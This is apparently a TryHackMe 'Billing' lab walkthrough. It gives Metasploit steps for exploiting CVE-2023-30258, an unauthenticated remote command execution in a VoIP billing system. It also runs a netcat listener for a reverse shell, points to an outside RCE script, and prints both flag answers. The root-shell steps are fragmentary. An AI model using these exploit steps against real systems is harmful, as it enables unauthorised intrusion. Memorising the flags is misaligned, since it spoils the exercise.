# Billing
Billing systems are critical tools used by businesses to manage invoicing, payment processing, and financial record-keeping. They ensure accurate and efficient transactions between service providers and customers, handling tasks such as generating invoices, tracking payments, and managing taxes and discounts. Common in industries like telecommunications, e-commerce, and healthcare, billing systems also support various payment methods for customer convenience.

In terms of security, these systems are prime targets for cyberattacks due to the sensitive financial data they store. Protecting billing systems from vulnerabilities is essential to prevent data breaches, fraud, and loss of customer trust.

Gain a shell, find the way and escalate your privileges!
Footprinting
<nmap -sV -sC -T4 <your machine ip>>

When we try to go to the web site with a browser, the only thing we see is a login page.
Given the note in the room description about avoiding bruteforcing, we can check for common credentials, but they don’t work.
After a short search, we see that it seems like an open-source VoIP billing and management system for managing SIP trunks, VoIP calls, and customer billing. It provides tools for call routing, monitoring, and invoicing.

Shell As asteriskus
This has an unauthenticated remote command execution vulnerability CVE-2023-30258, which is available as a manual exploit but is also present in the Metasploit framework.

We set up the exploit in the Metasploit framework and give it a try.
STEPS: 1. msfconsole
2. use exploit/Linux/http/magnusbilling_unauth_rce_cve_2023_30258
3. show targets
4. set target 1
5 .set lhost <your attack box ip>
6. set rhosts <your machine ip>
7. exploit

here session 1 is opened

command 1) id
2) cat /home/*/user.txt
flag 1 : What is user.txt?

ans: THM{4a6831d5f124b25eefb1e92e0f0da4ca}

Now find root flag
firstly download ( mangus_rce.py ) https://github.com/Hackhoven/Magento-RCE
“Run nc -lvnp 1337 in another terminal."

This is a command to start a netcat listener on port 1337

“Here is our root flag.”

THM{33ad5b530e71a172648f424ec23fae60}



